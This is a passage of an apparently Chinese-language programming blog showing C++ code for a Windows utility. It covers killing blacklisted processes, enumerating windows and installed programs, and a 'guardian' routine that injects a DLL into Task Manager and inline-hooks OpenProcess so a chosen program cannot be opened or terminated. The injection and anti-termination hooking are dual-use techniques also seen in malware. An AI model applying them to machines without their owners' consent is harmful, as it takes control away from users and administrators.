class="keyword">while</span> (Process32Next(hSnap, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="循环遍历进程"><a href="#循环遍历进程" class="headerlink" title="循环遍历进程"></a>循环遍历进程</h2><p>查找是否由黑名单进程，既然是循环肯定要开线程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//循环遍历进程，查看是否由黑名单程序运行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyLoadPeDlg::WhileProcessEunm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 判断快照句柄是否有效</span></span><br><span class="line"><span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//定义进程结构体，第一个元素必须赋值为结构体大小</span></span><br><span class="line">PROCESSENTRY32 stcPe32 = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"><span class="comment">//查找第一个进程</span></span><br><span class="line">Process32First(hSnapshot, &amp;stcPe32);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;<span class="comment">// 如果进程名一致，返回进程id</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m_vecHeiName.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (stcPe32.szExeFile == m_vecHeiName[i])</span><br><span class="line">&#123;</span><br><span class="line">HANDLE Process = OpenProcess(PROCESS_TERMINATE, FALSE, stcPe32.th32ProcessID);</span><br><span class="line">TerminateProcess(Process, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//CloseHandle(Process);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个进程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;stcPe32));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//关闭快照句柄</span></span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLLPATH <span class="meta-string">&quot;C:\\xxx\\InlineHook.dll&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//守护进程的回调函数</span></span><br><span class="line"><span class="function">WORD WINAPI <span class="title">ThreadGuardianProcessBack</span><span class="params">(LPARAM lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMyLoadPeDlg* pObj = (CMyLoadPeDlg*)lparam;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.获取目标进程句柄</span></span><br><span class="line"><span class="comment">// 1.1 获取指定进程id</span></span><br><span class="line">DWORD dwPid = GetPid(<span class="string">L&quot;Taskmgr.exe&quot;</span>);</span><br><span class="line"><span class="comment">// 1.2 打开进程（注入OD需要以管理员身份运行vs，否则无法打开进程)</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="comment">// 1.3 检测进程句柄</span></span><br><span class="line"><span class="keyword">if</span> (hProcess == INVALID_HANDLE_VALUE)</span><br><span class="line">ThreadGuardianProcessBack((LPARAM)pObj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.1 计算dll路径长度</span></span><br><span class="line">DWORD dwSize = <span class="built_in">strlen</span>(DLLPATH) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 2.在目标进程申请一段空间</span></span><br><span class="line">LPVOID lpAddr = VirtualAllocEx(</span><br><span class="line">hProcess, <span class="number">0</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, lpAddr, DLLPATH, dwSize, <span class="literal">NULL</span>))</span><br><span class="line">ThreadGuardianProcessBack((LPARAM)pObj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.创建远程线程</span></span><br><span class="line">HANDLE hRtThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">(LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddr, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">1000000</span>);</span><br><span class="line"><span class="comment">// 5.等待执行结果</span></span><br><span class="line">WaitForSingleObject(hRtThread, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6.获取线程退出码</span></span><br><span class="line">DWORD dwExitCode = <span class="number">0</span>;</span><br><span class="line">GetExitCodeThread(hRtThread, &amp;dwExitCode);</span><br><span class="line"><span class="comment">// 6.1 退出码也就是LoadLibrary的返回值（如果执行成功，就是dll的模块句柄）</span></span><br><span class="line">HMODULE hModule = (HMODULE)dwExitCode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7.释放空间</span></span><br><span class="line"><span class="keyword">if</span> (!VirtualFreeEx(hProcess, lpAddr, dwSize, MEM_DECOMMIT))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="所用dll"><a href="#所用dll" class="headerlink" title="所用dll"></a>所用dll</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过进程名获取进程id</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* filePath)</span></span>;</span><br><span class="line"><span class="comment">// 获取被保护程序pid</span></span><br><span class="line">DWORD g_dwPid = GetPid(<span class="string">L&quot;FileCleaner2.0.exe&quot;</span>);</span><br><span class="line"><span class="comment">// 旧的函数地址</span></span><br><span class="line">DWORD* g_pOldAddr = (DWORD*)OpenProcess;</span><br><span class="line"><span class="comment">// 旧的函数数据</span></span><br><span class="line"><span class="keyword">char</span> g_oldCode[<span class="number">5</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnHook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写自己的OpenProcess函数</span></span><br><span class="line"><span class="function">HANDLE WINAPI <span class="title">MyOpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ BOOL bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ DWORD dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 比对pid是否与helloworld程序相等</span></span><br><span class="line"><span class="keyword">if</span> (dwProcessId == g_dwPid)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="number">0</span>,<span class="string">L&quot;进程被保护&quot;</span>,<span class="string">L&quot;提示&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果不相等，重新调用原来的OpenProcess函数</span></span><br><span class="line"><span class="comment">// 先恢复原来函数数据</span></span><br><span class="line">UnHook();</span><br><span class="line">HANDLE hProcess = OpenProcess(</span><br><span class="line">dwDesiredAccess, bInheritHandle, dwProcessId);</span><br><span class="line"><span class="comment">// 调用完之后重新hook</span></span><br><span class="line">OnHook();</span><br><span class="line"><span class="keyword">return</span> hProcess;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line">OnHook();</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;注入成功&quot;</span>, <span class="string">L&quot;提示&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.先保存OpenProcess原来的数据</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_oldCode, g_pOldAddr, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.设置新的指令,jmp</span></span><br><span class="line"><span class="keyword">char</span> opcode[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;</span><br><span class="line"><span class="comment">// 2.1 计算偏移并赋值</span></span><br><span class="line">*(DWORD*)(opcode + <span class="number">1</span>) = (DWORD)MyOpenProcess - (DWORD)OpenProcess - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.修改保护属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">VirtualProtect(g_pOldAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.写入跳转指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_pOldAddr, opcode, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.还原保护属性</span></span><br><span class="line">VirtualProtect(g_pOldAddr, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.修改保护属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">VirtualProtect(g_pOldAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"><span class="comment">// 2.还原旧的指令数据</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_pOldAddr, g_oldCode, <span class="number">5</span>);</span><br><span class="line"><span class="comment">// 3.还原保护属性</span></span><br><span class="line">VirtualProtect(g_pOldAddr, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* szExeName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建进程快照</span></span><br><span class="line">HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 判断快照句柄是否有效</span></span><br><span class="line"><span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//定义进程结构体，第一个元素必须赋值为结构体大小</span></span><br><span class="line">PROCESSENTRY32 stcPe32 = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"><span class="comment">//查找第一个进程</span></span><br><span class="line">Process32First(hSnapshot, &amp;stcPe32);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;<span class="comment">// 如果进程名一致，返回进程id</span></span><br><span class="line"><span class="keyword">if</span> (!wcscmp(stcPe32.szExeFile, szExeName))</span><br><span class="line"><span class="keyword">return</span> stcPe32.th32ProcessID;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找下一个进程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;stcPe32));</span><br><span class="line"><span class="comment">//关闭快照句柄</span></span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="遍历窗口"><a href="#遍历窗口" class="headerlink" title="遍历窗口"></a>遍历窗口</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//枚举窗口</span></span><br><span class="line"><span class="function">BOOL CALLBACK <span class="title">EnumWindowsProc</span><span class="params">(HWND hWnd, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">CMyLoadPeDlg* t = (CMyLoadPeDlg*)lParam;</span><br><span class="line">TCHAR buff[<span class="number">200</span>];</span><br><span class="line">TCHAR ClassName[<span class="number">200</span>];</span><br><span class="line">GetWindowText(hWnd, buff, <span class="number">200</span>);</span><br><span class="line">GetClassName(hWnd, ClassName,<span class="number">200</span> );</span><br><span class="line"><span class="comment">//HICON hIcon = (HICON)GetClassLongPtr(hWnd, GCLP_HICON);</span></span><br><span class="line"><span class="keyword">static</span> HICON hIcon = LoadIcon(AfxGetApp()-&gt;m_hInstance, MAKEINTRESOURCE(IDR_MAINFRAME));<span class="comment">//加载本地自己的图标</span></span><br><span class="line">CString cs;</span><br><span class="line"><span class="keyword">if</span> (hIcon != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">t-&gt;m_vecIcon.push_back(hIcon);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWindowVisible(hWnd) == TRUE &amp;&amp; wcslen(buff) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">cs.Format(<span class="string">L&quot;%s&quot;</span>, buff);</span><br><span class="line">t-&gt;m_objEMWNDLope.InsertItem(i, cs , i);</span><br><span class="line">t-&gt;m_objEMWNDLope.SetItemText(i, <span class="number">1</span>, ClassName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cs=ClassName;</span></span><br><span class="line"></span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="获取进程PID"><a href="#获取进程PID" class="headerlink" title="获取进程PID"></a>获取进程PID</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* szExeName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建进程快照</span></span><br><span class="line">HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 判断快照句柄是否有效</span></span><br><span class="line"><span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//定义进程结构体，第一个元素必须赋值为结构体大小</span></span><br><span class="line">PROCESSENTRY32 stcPe32 = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"><span class="comment">//查找第一个进程</span></span><br><span class="line">Process32First(hSnapshot, &amp;stcPe32);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;<span class="comment">// 如果进程名一致，返回进程id</span></span><br><span class="line"><span class="keyword">if</span> (!wcscmp(stcPe32.szExeFile, szExeName))</span><br><span class="line"><span class="keyword">return</span> stcPe32.th32ProcessID;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找下一个进程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;stcPe32));</span><br><span class="line"><span class="comment">//关闭快照句柄</span></span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="将wchar-t类型转换为整形"><a href="#将wchar-t类型转换为整形" class="headerlink" title="将wchar_t类型转换为整形"></a>将wchar_t类型转换为整形</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CString strPid = m_objProcessList.GetItemText(item, <span class="number">1</span>);  <span class="comment">//获取文本框</span></span><br><span class="line">DWORD dwPID = _wtoi(strPid);<span class="comment">//转换为整型</span></span><br></pre></td></tr></table></figure><h1 id="安装程序的遍历及卸载"><a href="#安装程序的遍历及卸载" class="headerlink" title="安装程序的遍历及卸载"></a>安装程序的遍历及卸载</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//,需要开线程不然很卡</span></span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)ThreadPro, <span class="keyword">this</span>-&gt;m_objInstallList, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//已安装程序的获取（回调函数）</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro</span><span class="params">(CListCtrl Soft)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//CImageList m_objIma;</span></span><br><span class="line"><span class="comment">//m_objIma.Create(16, 16, ILC_COLOR32, 4, 1);     //创建图像序列CImageList对象 </span></span><br><span class="line"><span class="comment">//Soft.SetImageList(&amp;m_objIma, LVSIL_SMALL);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SoftInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">// 软件名</span></span><br><span class="line">WCHAR m_strSoftName[<span class="number">50</span>];</span><br><span class="line"><span class="comment">// 软件版本号</span></span><br><span class="line">WCHAR m_strSoftVersion[<span class="number">50</span>];</span><br><span class="line"><span class="comment">// 软件安装目录</span></span><br><span class="line">WCHAR m_strInstallLocation[MAX_PATH];</span><br><span class="line"><span class="comment">// 软件发布厂商</span></span><br><span class="line">WCHAR m_strPublisher[<span class="number">50</span>];</span><br><span class="line"><span class="comment">// 主程序所在完整路径</span></span><br><span class="line">WCHAR m_strMainProPath[MAX_PATH];</span><br><span class="line"><span class="comment">// 卸载exe所在完整路径</span></span><br><span class="line">WCHAR m_strUninstallPth[MAX_PATH];</span><br><span class="line">&#125;SoftInfo;</span><br><span class="line"><span class="comment">// 主键</span></span><br><span class="line">HKEY RootKey;</span><br><span class="line"><span class="comment">// 子键名称</span></span><br><span class="line">LPCTSTR lpSubKey;</span><br><span class="line"><span class="comment">// 将要打开键的句柄 </span></span><br><span class="line">HKEY hkResult;</span><br><span class="line"><span class="comment">// 记录读取注册表是否成功</span></span><br><span class="line">LONG lReturn;</span><br><span class="line">CString strBuffer;</span><br><span class="line">CString strMidReg;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">DWORD index = <span class="number">0</span>;</span><br><span class="line">TCHAR szKeyName[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;        <span class="comment">// 注册表项名称</span></span><br><span class="line">TCHAR szBuffer[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwKeyLen = <span class="number">255</span>;</span><br><span class="line">DWORD dwNameLen = <span class="number">255</span>;</span><br><span class="line">DWORD dwType = REG_BINARY | REG_DWORD | REG_EXPAND_SZ | REG_MULTI_SZ | REG_NONE | REG_SZ;</span><br><span class="line">CString* name = <span class="keyword">new</span> 